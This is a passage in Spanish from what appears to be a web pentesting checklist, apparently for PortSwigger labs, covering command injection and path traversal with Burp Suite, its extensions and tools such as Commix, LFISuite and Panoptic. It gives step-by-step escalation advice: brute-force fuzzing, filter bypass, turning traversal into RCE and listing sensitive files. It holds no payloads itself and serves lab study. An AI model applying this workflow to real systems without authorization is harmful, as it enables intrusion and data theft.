5. Desafortunadamente, `Commix` no funciona al `100%` en los `laboratorios de Portswigger` por el `firewall` que tienen implementado pero es una `herramienta` muy `recomendable` si es posible usarla

6. Realizar un `ataque de fuerza bruta` con el `Intruder` y los diccionarios mencionados en `hacking tools`. Si no encontramos nada, usar los `payloads` de la extensión `Agartha` de `Burpsuite` y si tampoco encontramos nada, usar la extensión `Command injection attacker` de `Burpsuite`. Es recomendable `setear` la opción `Delay between requests` en `1` y desactivar el `Automatic throttling` para que `el tiempo de respuesta del servidor varíe lo menos posible`, esto es importante para poder `identificar` si hay un `blind command injection`. También debemos `disminuir` el `número de hilos` para `no colapsar` el `servidor`

7. Si no encontramos nada con los `escáneres` podemos `checkear` las `cheatsheets` de `PayloadsAllTheThings` y `Hacktricks` pero lo más seguro es que no haya un `command injection`

## Path traversal

1. `Instalar` las `extensiones básicas` de `Burpsuite` y también la extensión `Nginx Alias Traversal`
    
2. `Añadir` el `dominio` y sus `subdominios` al `scope`
    
3. Hacer un `escaneo general` con `Burpsuite`. Como `tipo de escaneo` marcaremos `Crawl and audit` y como `configuración de escaneo` usaremos `Deep`
    
4. `Escanearemos partes específicas de la petición` usando el `escáner de Burpsuite`. Para `escanear` los `insertion points` debemos seleccionar en `tipo de escaneo` la opción `Audit selected items`
    
5. Efectuamos un `ataque de fuerza bruta` utilizando los `payloads` de `Agartha`

6. Haremos otro `ataque de fuerza bruta` utilizando el `diccionario` que trae `Burpsuite` llamado `Fuzzing - path traversal (single file)`. En la parte de `payload processing` agregamos la regla `Match/replace`. Seguidamente, en el apartado `Match regex` debemos `escapar los caracteres especiales`, así que se quedaría tal que así `\{file\}`. Finalmente, en el apartado `Replace with` pondremos el `nombre del fichero` que queramos `fuzzear`

7. Hacemos lo mismo con el `diccionario integrado de Burpsuite` llamado `Fuzzing - path traversal`. Deberemos hacer lo mismo que en el apartado anterior en la parte de `payload processing`, pero en este caso agregaremos `\{base\}` en el primer apartado

8. Si aún seguimos sin encontrar nada, usaremos el `diccionario` de `Loxs` para realizar un `ataque de fuerza bruta` con `Burpsuite`

9. Si no hemos podido `explotar` el `path traversal` hasta ahora, puede ser porque `se han implementado medidas de seguridad adicionales`. Para intentar `bypassearlas` vamos a usar primeramente `LFISuite`, seguidamente `LFITester` y por último, `Liffy`

10. Si no encontramos nada, `checkearemos` las `cheatsheets` de `PayloadsAllTheThings` y `Hacktricks` e iremos `testeando de forma manual`. Si vemos `payloads` o `diccionarios` para aplicar `fuerza bruta` debemos probarlos

11. Una vez hayamos conseguido `explotar` el `path traversal`, podemos intentar `convertirlo` en un `RCE` usando `LFISuite`, `LFITester` o `Liffy`. Si no podemos, deberemos hacerlo `manualmente`

12. En el caso de que `no podamos convertir el path traversal en un RCE`, vamos a `listar información sensible` de la `máquina` usando `Panoptic`. En el caso en el que se nos complique usar la herramienta, podemos usar el `Intruder` de `Burpsuite` con el `diccionario` que usa `Panoptic` o con otros `diccionarios`
